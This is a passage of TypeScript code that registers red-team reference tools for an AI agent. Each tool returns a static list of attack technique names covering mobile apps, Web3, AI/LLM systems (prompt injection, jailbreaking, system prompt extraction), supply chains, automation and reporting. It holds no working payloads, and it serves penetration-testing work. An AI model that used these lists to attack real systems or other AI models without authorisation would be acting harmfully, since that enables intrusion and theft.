						"Android: APK analysis, Frida, objection",
						"iOS: IPA analysis, Frida, objection",
						"Mobile API: auth bypass, IDOR, token theft",
						"Certificate pinning bypass",
						"Root/jailbreak detection bypass",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Web3 ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_web3",
			description: "Generate Web3/blockchain attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Smart contract vulnerabilities",
						"Reentrancy, overflow, access control",
						"Flash loan attacks",
						"Oracle manipulation",
						"NFT theft",
					],
				};
			},
		}) as AgentTool,
	);

	// --- AI/LLM ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_llm_attack",
			description: "Generate AI/LLM attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Prompt injection (direct/indirect)",
						"Jailbreaking",
						"System prompt extraction",
						"Data poisoning",
						"Model extraction",
						"Adversarial examples",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Supply chain ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_supply_chain",
			description: "Generate supply chain attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Dependency confusion",
						"Typosquatting",
						"Compromised packages",
						"Build pipeline attacks",
						"Container image poisoning",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Reporting ---
	tools.push(
		createTool<Record<string, never>, { sections: string[] }>({
			name: "rt_ref_report_advanced",
			description: "Generate advanced report sections.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					sections: [
						"Executive summary",
						"Technical findings",
						"Evidence (screenshots, requests)",
						"Remediation",
						"Compliance mapping",
						"Risk scoring",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Automation ---
	tools.push(
		createTool<Record<string, never>, { features: string[] }>({
			name: "rt_ref_automation",
			description: "Generate automation features.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					features: [
						"Scan scheduling",
						"Exploit chaining",
						"Report generation",
						"Notification (Slack, email, webhook)",
						"Integration (SIEM, SOAR, ticketing)",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Learning ---
	tools.push(
		createTool<Record<string, never>, { features: string[] }>({
			name: "rt_ref_learning",
			description: "Generate learning/adaptation features.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					features: [
						"Memory of what worked",
						"Pattern recognition",
						"Predictive next steps",
						"Emotional state tracking",
						"Context retention",
						"Self-reflection",
					],
				};
			},
		}) as AgentTool,
	);

}
